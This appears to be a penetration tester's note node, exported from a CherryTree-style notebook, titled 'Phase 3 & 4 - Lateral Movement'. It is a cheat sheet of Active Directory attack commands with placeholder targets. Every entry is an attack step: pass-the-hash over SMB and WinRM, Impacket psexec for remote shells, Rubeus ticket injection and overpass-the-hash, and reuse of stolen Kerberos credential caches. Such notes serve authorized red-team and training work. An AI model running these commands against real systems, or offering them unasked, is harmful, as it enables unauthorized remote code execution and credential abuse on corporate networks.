      <node name="Phase 3 &amp; 4 - Lateral Movement" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>nxc smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
# Testing inbound target network access profiles using discovered local account hashes
--------------------------------------------------
psexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
# Spawning interactive remote process terminals via injected NT hashes strings (Impacket)
--------------------------------------------------
evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;
# Spawning interactive remote process terminals via injected NT hashes strings (WinRM)
--------------------------------------------------
.\Rubeus.exe triage
# Triage auditing of stored Kerberos authentication tickets in current session memory
--------------------------------------------------
.\Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;
# Injecting extracted Base64 Kerberos ticket strings into system volatile space
--------------------------------------------------
.\Rubeus.exe asktgt /user:administrator /rc4:&lt;NTLM_HASH&gt; /domain:corp.local /dc:192.168.x.100 /ptt
# Generating remote authentication tickets natively via stored secret passwords (Overpass-the-Hash)
--------------------------------------------------
export KRB5CCNAME=/tmp/ticket.ccache
# Registering exfiltrated credential caches for corporate Kerberos authenticated access paths (Linux)
--------------------------------------------------
psexec.py -k -no-pass corp.local/administrator@&lt;TARGET_FQDN&gt;
# Executing administrative code processes using loaded Kerberos credential caches
--------------------------------------------------
getTGT.py corp.local/user -hashes :&lt;NTLM_HASH&gt; -dc-ip 192.168.x.100
# Requesting outbound domain TGT sessions over network channels via NT hashing arrays (Linux)
--------------------------------------------------</rich_text>
